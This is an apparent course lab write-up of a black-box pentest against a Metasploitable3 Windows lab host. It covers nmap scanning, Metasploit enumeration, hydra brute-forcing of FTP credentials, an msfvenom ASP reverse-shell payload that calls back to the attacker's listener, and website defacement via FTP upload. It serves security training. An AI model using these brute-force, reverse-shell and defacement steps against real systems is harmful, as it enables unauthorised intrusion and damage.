# ðŸ”¬Win Black Box Pentest

> ðŸ”¬ INE LAB - [Metasploitable3](https://github.com/rapid7/metasploitable3)
>
> * Target IP: `10.0.25.110`
> * **Metasploit Framework** is permitted

## Port Scanning & Enumeration <a href="#port-scanning-and-enumeration" id="port-scanning-and-enumeration"></a>

* Obtain the target `IP` address from the `/etc/hosts` file

```bash
cat /etc/hosts
ping 10.0.25.110
ping demo.ine.local
cd Desktop
mkdir Win2k8
cd WiWin2k8/ # To store all the notes and files about the target
```

<figure><img src="../../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

* **Port scanning** with `nmap`

```bash
nmap -sV 10.0.25.110
# Scans 1000 common ports
```

```bash
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http                 Microsoft IIS httpd 7.5
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql                MySQL 5.5.20-log
3389/tcp  open  tcpwrapped
4848/tcp  open  ssl/http             Oracle Glassfish Application Server
7676/tcp  open  java-message-service Java Message Service 301
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
8181/tcp  open  ssl/intermapper?
9200/tcp  open  wap-wsp?
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49158/tcp open  msrpc                Microsoft Windows RPC

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

* Perform an **advanced `nmap` scan** and export it into an `xml` file

```bash
nmap -T4 -PA -sC -sV -p 1-10000 10.0.25.110 -oX nmap_10k
# -T4 = Aggressive speed scan
# -PA = TCP ACK discovery
# -sC = default NSE scripts
# -sV = service version detection
# -p 1-10000 = ports range
# -oX = XML output file

# A full port range scan can be also done, not necessary here
# nmap -T4 -PA -sC -sV -p- 10.2.29.246 -oX nmap_all
```

* **`e.g.`** Extra `nmap` useful scans commands

```bash
nmap -T4 -PA -sC -sV -p- 10.0.25.110 -oX nmap_all
nmap -sU -sV 10.0.25.110 -oX nmap_udp
```

<figure><img src="../../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

Access the web server with a browser

* `http://10.0.25.110/`
* `http://10.0.25.110/hahaha.jpg`
* View page source

<figure><img src="../../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

* **Banner grabbing** on some services

```bash
nc -nv 10.0.25.110 21
    Ncat: Version 7.92 ( https://nmap.org/ncat )
    Ncat: Connected to 10.0.25.110:21.
    220 Microsoft FTP Service
```

* Other webpages
  * `https://10.0.25.110:4848/`
  * `http://10.0.25.110:8080/`
  * `http://10.0.25.110:8484/`
  * `http://10.0.25.110:8585/`
    * `http://10.0.25.110:8585/wordpress/`
  * `http://10.0.25.110:9200/`

<figure><img src="../../../../.gitbook/assets/image (257).png" alt=""><figcaption><p><code>https://10.0.25.110:4848/</code></p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (258).png" alt=""><figcaption><p><code>https://10.0.25.110:8080/</code></p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (259).png" alt=""><figcaption><p><code>https://10.0.25.110:8484/</code></p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (261).png" alt=""><figcaption><p><code>https://10.0.25.110:8585/</code></p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (262).png" alt=""><figcaption><p><code>https://10.0.25.110:8585/wordpress/</code></p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (263).png" alt=""><figcaption><p><code>https://10.0.25.110:9200/</code></p></figcaption></figure>

### SMB Enumeration <a href="#smb-enumeration" id="smb-enumeration"></a>

<figure><img src="../../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

* **Import scan results in MSF** by creating a **dedicated workspace**

```bash
service postgresql start && msfconsole
```

```bash
db_status
setg RHOSTS 10.0.25.110
workspace -a Win2k8
db_import /root/Desktop/Win2k8/nmap_10k
    [*] Importing 'Nmap XML' data
    [*] Import: Parsing with 'Nokogiri v1.13.0'
    [*] Importing host 10.0.25.110
    [*] Successfully imported /root/Desktop/Win2k8/nmap_10k
```

```bash
hosts
services
use auxiliary/scanner/smb/smb_version
run
hosts
# Name of computer is correct now
```

<figure><img src="../../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

## Targeting <a href="#targeting" id="targeting"></a>

### [IIS / FTP](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/iis-webdav) <a href="#iis-ftp" id="iis-ftp"></a>

> Obtain the new target IP if the lab was restarted.
>
> Target IP: `10.0.18.177`
>
> Based on the FTP Enumeration:
>
> * `administrator`:`vagrant`
> * `vagrant`:`vagrant`

```bash
nmap -sV -sC -p 21, 80 10.0.18.177

# FTP is part of the Microsoft IIS package 
```

* Try `anonymous`:`anonymous` with FTP

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

* **Brute-force** the FTP server

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.18.177 ftp

# try to brute force for vagrant user also
hydra -l vagrant -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.0.18.177 ftp -I
```

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

> ðŸ“Œ 2 FTP users:
>
> * `administrator`:`vagrant`
> * `vagrant`:`vagrant`
>
> Remember to save these credentials for later use

```bash
ftp 10.0.18.177
# Use administrator:vagrant
```

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```bash
ftp> ls
    229 Entering Extended Passive Mode (|||49347|)
    125 Data connection already open; Transfer starting.
    10-28-21  07:22AM       <DIR>          aspnet_client
    10-28-21  07:19AM                   28 caidao.asp
    10-28-21  07:18AM                34251 hahaha.jpg
    10-28-21  07:18AM              1116928 index.html
    10-28-21  07:18AM              2439511 seven_of_hearts.html
    10-28-21  07:18AM               384916 six_of_diamonds.zip
    10-28-21  07:22AM               184946 welcome.png
    226 Transfer complete.

# Web server home directory
```

* IIS can execute `.asp` files
* Generate an `.asp` reverse shell payload and upload it with FTP

```bash
cd Desktop/Win2k8/
ifconfig
	10.10.21.2
	
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.21.2 LPORT=1234 -f asp > shell.aspx
```

```bash
ftp 10.0.18.177
# use vagrant:vagrant
put shell.aspx
```

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Back to the `msfconsole` session tab

```bash
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST 10.10.21.2
set LPORT 1234
run
```

* Open the browser and navigate to
  * `10.0.18.177/shell.aspx`
* In this case the reverse shell don't work.
*

    <figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
* The next step of an attacker can be to **deface the website** - modifying the web application

```bash
ftp 10.0.18.177
get index.html
# modify the index.html than upload the edited web page
put index.html
```

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* Open browser and navigate to `10.0.18.177`

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### [OpenSSH](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/ssh-msf-exp) <a href="#openssh" id="openssh"></a>

> Obtain the new target IP if the lab was restarted.
>
> Target IP:&#x20;
>
> Based on the FTP Enumeration:
>
> * `administrator`:`vagrant`
> * `vagrant`:`vagrant`

